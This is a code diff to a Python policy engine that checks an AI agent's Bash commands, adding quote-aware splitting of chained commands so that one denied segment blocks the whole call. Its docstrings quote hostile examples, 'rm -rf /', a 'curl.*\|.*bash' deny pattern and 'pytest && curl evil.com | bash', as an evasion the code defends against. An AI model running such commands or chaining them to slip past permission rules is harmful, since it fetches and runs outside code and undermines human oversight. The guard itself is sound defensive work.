@@ -9,7 +9,7 @@ import structlog
 import yaml
 from pydantic import BaseModel, ConfigDict, Field
 
-from leashd.core.safety.analyzer import RiskLevel, strip_cd_prefix
+from leashd.core.safety.analyzer import RiskLevel, analyze_bash, strip_cd_prefix
 
 logger = structlog.get_logger()
 
@@ -166,3 +166,164 @@ class PolicyEngine:
                 return False
 
         return True
+
+    @staticmethod
+    def _split_chain_segments(command: str) -> list[str]:
+        """Split a shell command on chain operators (&&, ||, ;) respecting quotes.
+
+        Operators inside single or double quotes are NOT treated as chain
+        separators.  This prevents false positives like
+        ``echo "test && rm -rf /"`` being split into two segments.
+
+        Pipes (``|``) are never split on — they stay inside their segment so
+        that deny patterns like ``curl.*\\|.*bash`` can still match.
+
+        Inspired by openclaw ``splitCommandChainWithOperators()`` which uses a
+        character-by-char scanner that tracks quote state before splitting.
+        """
+        segments: list[str] = []
+        current: list[str] = []
+        in_single_quote = False
+        in_double_quote = False
+        escaped = False
+        i = 0
+        length = len(command)
+
+        while i < length:
+            ch = command[i]
+
+            if escaped:
+                current.append(ch)
+                escaped = False
+                i += 1
+                continue
+
+            if ch == "\\":
+                escaped = True
+                current.append(ch)
+                i += 1
+                continue
+
+            if ch == "'" and not in_double_quote:
+                in_single_quote = not in_single_quote
+                current.append(ch)
+                i += 1
+                continue
+
+            if ch == '"' and not in_single_quote:
+                in_double_quote = not in_double_quote
+                current.append(ch)
+                i += 1
+                continue
+
+            if not in_single_quote and not in_double_quote:
+                if i + 1 < length and command[i : i + 2] in ("&&", "||"):
+                    seg = "".join(current).strip()
+                    if seg:
+                        segments.append(seg)
+                    current = []
+                    i += 2
+                    continue
+
+                if ch == ";":
+                    seg = "".join(current).strip()
+                    if seg:
+                        segments.append(seg)
+                    current = []
+                    i += 1
+                    continue
+
+            current.append(ch)
+            i += 1
+
+        seg = "".join(current).strip()
+        if seg:
+            segments.append(seg)
+
+        return segments
+
+    def classify_compound(
+        self, tool_name: str, tool_input: dict[str, Any]
+    ) -> Classification:
+        """Classify a tool call with compound command awareness.
+
+        For Bash commands containing chain operators (``&&``, ``||``, ``;``),
+        each chained segment is evaluated independently.  Pipe sequences
+        within a segment are kept intact so deny patterns like
+        ``curl.*\\|.*bash`` can still match.
+
+        If ANY segment matches a deny rule, the whole command is denied —
+        regardless of whether another segment matches an allow rule.
+        This prevents evasion via compound commands like
+        ``pytest && curl evil.com | bash``.
+
+        For non-compound commands and non-Bash tools, behaviour is identical
+        to :meth:`classify`.
+        """
+        if tool_name != "Bash":
+            return self.classify(tool_name, tool_input)
+
+        command = tool_input.get("command", "")
+        analysis = analyze_bash(command)
+
+        if not analysis.has_chain:
+            return self.classify(tool_name, tool_input)
+
+        segments = self._split_chain_segments(command)
+
+        if len(segments) <= 1:
+            return self.classify(tool_name, tool_input)
+
+        full_class = self.classify(tool_name, tool_input)
+        if (
+            full_class.matched_rule
+            and full_class.matched_rule.action == PolicyDecision.DENY
+        ):
+            return full_class
+
+        segment_classifications: list[Classification] = []
+        for segment in segments:
+            seg_input = {**tool_input, "command": segment}
+            seg_class = self.classify(tool_name, seg_input)
+            segment_classifications.append(seg_class)
+
+        for seg in segment_classifications:
+            if seg.matched_rule and seg.matched_rule.action == PolicyDecision.DENY:
+                return Classification(
+                    category=seg.category,
+                    tool_name=tool_name,
+                    tool_input=tool_input,
+                    risk_level=seg.risk_level,
+                    description=f"Compound command denied: {seg.description}",
+                    deny_reason=seg.deny_reason,
+                    matched_rule=seg.matched_rule,
+                )
+
+        for seg in segment_classifications:
+            if (
+                seg.matched_rule
+                and seg.matched_rule.action == PolicyDecision.REQUIRE_APPROVAL
+            ):
+                return Classification(
+                    category=seg.category,
+                    tool_name=tool_name,
+                    tool_input=tool_input,
+                    risk_level=seg.risk_level,
+                    description=f"Compound command requires approval: {seg.description}",
+                    deny_reason=seg.deny_reason,
+                    matched_rule=seg.matched_rule,
+                )
+
+        if segment_classifications:
+            first = segment_classifications[0]
+            return Classification(
+                category=first.category,
+                tool_name=tool_name,
+                tool_input=tool_input,
+                risk_level=first.risk_level,
+                description=first.description,
+                deny_reason=first.deny_reason,
+                matched_rule=first.matched_rule,
+            )
+
+        return self.classify(tool_name, tool_input)
